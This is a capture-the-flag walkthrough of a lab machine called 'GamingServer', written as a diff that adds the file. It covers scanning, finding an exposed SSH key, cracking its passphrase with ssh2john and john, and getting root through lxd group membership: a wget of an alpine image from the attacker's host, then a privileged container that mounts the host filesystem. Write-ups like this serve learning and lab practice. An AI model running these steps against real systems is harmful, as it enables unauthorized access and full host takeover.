@@ -1,0 +1,219 @@
+IP:10.10.11.245
+
+Nmap scan results
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 10.10.11.245 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 18:52 IST
+Nmap scan report for 10.10.11.245
+Host is up (0.16s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
+|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
+|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: House of danak
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/18%OT=22%CT=1%CU=34583%PV=Y%DS=2%DC=T%G=Y%TM=5F8C41
+OS:BF%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
+OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   220.51 ms 10.9.0.1
+2   220.69 ms 10.10.11.245
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.17 seconds
+
+Dirb scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.11.245
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Oct 18 18:54:28 2020
+URL_BASE: http://10.10.11.245/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.11.245/ ----
++ http://10.10.11.245/index.html (CODE:200|SIZE:2762)                                                                                                                                                       
++ http://10.10.11.245/robots.txt (CODE:200|SIZE:33)                                                                                                                                                         
+==> DIRECTORY: http://10.10.11.245/secret/                                                                                                                                                                  
++ http://10.10.11.245/server-status (CODE:403|SIZE:277)                                                                                                                                                     
+==> DIRECTORY: http://10.10.11.245/uploads/                                                                                                                                                                 
+                                                                                                                                                                                                            
+---- Entering directory: http://10.10.11.245/secret/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                            
+---- Entering directory: http://10.10.11.245/uploads/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Sun Oct 18 19:08:44 2020
+DOWNLOADED: 4612 - FOUND: 3
+root@LAPTOP-U5913CMD:/home/akshay# 
+
+
+SO the uploads directory is accessible.
+We have something known as manifesto.txt and it contains this strange conversation.
+
+We also have this dict.lst
+
+http://10.10.11.245/uploads/dict.lst
+
+It might contain some passwords and can be very useful.
+
+<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
+
+john can be a user on the machine or server.
+
+So we also got a ssh key
+
+http://10.10.11.245/secret/secretKey
+
+What the heck is happening.
+
+So I tried loggin in as john and it was asking for secrey key passphrase.
+
+Make sure to change the permissions of the private key in this case - secretKey to 600
+
+SO here comes the use of ssh2john.py
+
+FOllow me:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/GamingServer# python ssh2john.py secretKey > hash
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/GamingServer# john hash --wordlist=/home/akshay/Desktop/GamingServer/dict.lst 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (secretKey)
+1g 0:00:00:00 DONE (2020-10-18 19:11) 9.090g/s 2018p/s 2018c/s 2018C/s 2003..starwars
+Session completed
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/GamingServer# 
+
+We used the dict.lst file as a wordlist to crack the passphrase for the secretFile.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/GamingServer# ssh -i secretKey john@10.10.11.245
+load pubkey "secretKey": invalid format
+Enter passphrase for key 'secretKey': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Oct 18 13:42:40 UTC 2020
+
+  System load:  0.0               Processes:           97
+  Usage of /:   41.1% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.11.245
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+john@exploitable:~$ 
+
+
+john@exploitable:~$ ls
+user.txt
+john@exploitable:~$ cat user.txt
+a5c2ff8b9c2###################
+john@exploitable:~$ 
+
+So this room is about a gaming server,so what we can do is try looking out for lxd.
+
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+john@exploitable:~$ 
+
+As you can see this user belongs to a group - lxd(108)
+
+Here's a link to a great explanation of lxd privilege escalation
+
+https://www.hackingarticles.in/lxd-privilege-escalation/
+
+https://github.com/saghul/lxd-alpine-builder
+
+Download this.
+
+john@exploitable:/tmp$ wget http://10.9.81.62:1234/alpine-v3.12-x86_64-20201017_2243.tar.gz
+--2020-10-18 13:58:06--  http://10.9.81.62:1234/alpine-v3.12-x86_64-20201017_2243.tar.gz
+Connecting to 10.9.81.62:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3175707 (3.0M) [application/gzip]
+Saving to: ‘alpine-v3.12-x86_64-20201017_2243.tar.gz’
+
+alpine-v3.12-x86_64-20201017_2243.tar.gz            100%[================================================================================================================>]   3.03M   593KB/s    in 11s     
+
+2020-10-18 13:58:17 (286 KB/s) - ‘alpine-v3.12-x86_64-20201017_2243.tar.gz’ saved [3175707/3175707]
+
+john@exploitable:/tmp$ 
+
+lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias akshay
+
+
+john@exploitable:/tmp$ lxc image import alpine-v3.12-x86_64-20201017_2243.tar.gz --alias akshay
+Image imported with fingerprint: ed4dcd2f38da7e1cb95aeb404882fccd8cacc3e9695db33d6d3632ad6f810e83
+john@exploitable:/tmp$ 
+
+john@exploitable:/tmp$ lxc init akshay gg -c security.privileged=true
+Creating gg
+john@exploitable:/tmp$ lxc config device add gg mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to gg
+john@exploitable:/tmp$ lxc start gg
+john@exploitable:/tmp$ lxc exec gg /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # 
+
+~ # cd /mnt
+/mnt # cd root
+/mnt/root # ls
+bin             dev             initrd.img      lib64           mnt             root            snap            sys             var
+boot            etc             initrd.img.old  lost+found      opt             run             srv             tmp             vmlinuz
+cdrom           home            lib             media           proc            sbin            swap.img        usr             vmlinuz.old
+/mnt/root # cd root
+/mnt/root/root # ls
+root.txt
+/mnt/root/root # cat root.txt
+2e337b8c9f3a####################
+/mnt/root/root # 
+
+Thank you. Happy Hacking :)
+
+-Voker2311
